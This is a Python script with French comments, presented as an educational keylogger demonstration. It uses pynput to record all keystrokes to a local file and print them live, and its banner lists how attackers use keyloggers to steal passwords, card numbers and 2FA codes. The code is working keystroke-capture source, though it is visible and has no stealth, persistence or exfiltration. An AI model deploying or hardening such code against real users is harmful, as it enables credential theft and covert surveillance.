#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║              KEYLOGGER ÉDUCATIF - DÉMONSTRATION                  ║
║                                                                  ║
║  ⚠️  USAGE ÉDUCATIF UNIQUEMENT - NE PAS UTILISER SUR AUTRUI ⚠️   ║
╚══════════════════════════════════════════════════════════════════╝

Ce script montre comment fonctionne un keylogger basique.
Un vrai keylogger serait invisible et s'exécuterait au démarrage.
"""

import os
import sys
import time
from datetime import datetime

# Essayer d'importer pynput
try:
    from pynput import keyboard
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False

LOG_FILE = "keylog_demo.txt"
captured_keys = []

def on_press(key):
    """Callback appelé à chaque frappe de touche"""
    timestamp = datetime.now().strftime("%H:%M:%S")
    
    try:
        # Touche normale (lettre, chiffre)
        char = key.char
        log_entry = char
    except AttributeError:
        # Touche spéciale (Enter, Space, etc.)
        special_keys = {
            keyboard.Key.space: " [ESPACE] ",
            keyboard.Key.enter: " [ENTRÉE]\n",
            keyboard.Key.tab: " [TAB] ",
            keyboard.Key.backspace: " [RETOUR] ",
            keyboard.Key.shift: "",
            keyboard.Key.ctrl_l: " [CTRL] ",
            keyboard.Key.alt_l: " [ALT] ",
            keyboard.Key.caps_lock: " [CAPS] ",
            keyboard.Key.esc: " [ESC] ",
        }
        log_entry = special_keys.get(key, f" [{key}] ")
    
    if log_entry:
        captured_keys.append(log_entry)
        
        # Afficher en temps réel
        print(f"\r🔴 Capture: {''.join(captured_keys[-50:])}", end="", flush=True)
        
        # Sauvegarder dans le fichier
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(log_entry)

def on_release(key):
    """Arrêter avec Echap"""
    if key == keyboard.Key.esc:
        print("\n\n🛑 Keylogger arrêté!")
        return False

def main():
    print("""
╔══════════════════════════════════════════════════════════════════╗
║              🎹 KEYLOGGER ÉDUCATIF - DÉMONSTRATION               ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  Ce programme capture TOUTES les frappes clavier.                ║
║  Dans une vraie attaque, cela serait invisible!                  ║
║                                                                  ║
║  🎯 UTILISATION PAR LES HACKERS:                                 ║
║     - Vol de mots de passe                                       ║
║     - Espionnage de conversations                                ║
║     - Vol de numéros de carte bancaire                           ║
║     - Vol de codes 2FA                                           ║
║                                                                  ║
╠══════════════════════════════════════════════════════════════════╣
║  Appuyez sur ECHAP pour arrêter                                  ║
╚══════════════════════════════════════════════════════════════════╝
    """)
    
    if not PYNPUT_AVAILABLE:
        print("❌ Module 'pynput' non installé!")
        print("   Installez-le avec: pip install pynput")
        print("\n📋 Simulation du fonctionnement:")
        print("""
   [KEYLOGGER ACTIF]
   
   Victime tape: m o n M o t D e P a s s e 1 2 3
   
   Fichier log contient:
   ─────────────────────────────────────────────
   monMotDePasse123
   ─────────────────────────────────────────────
   
   Le hacker récupère ce fichier et voit tous les mots de passe!
        """)
        return
    
    print("🔴 KEYLOGGER ACTIF - Tapez quelque chose...\n")
    
    # Démarrer l'écoute
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    
    # Afficher le résultat
    print(f"\n📁 Frappes enregistrées dans: {LOG_FILE}")
    print("\n📋 Contenu capturé:")
    print("─" * 50)
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r", encoding="utf-8") as f:
            print(f.read())
    print("─" * 50)

if __name__ == "__main__":
    main()
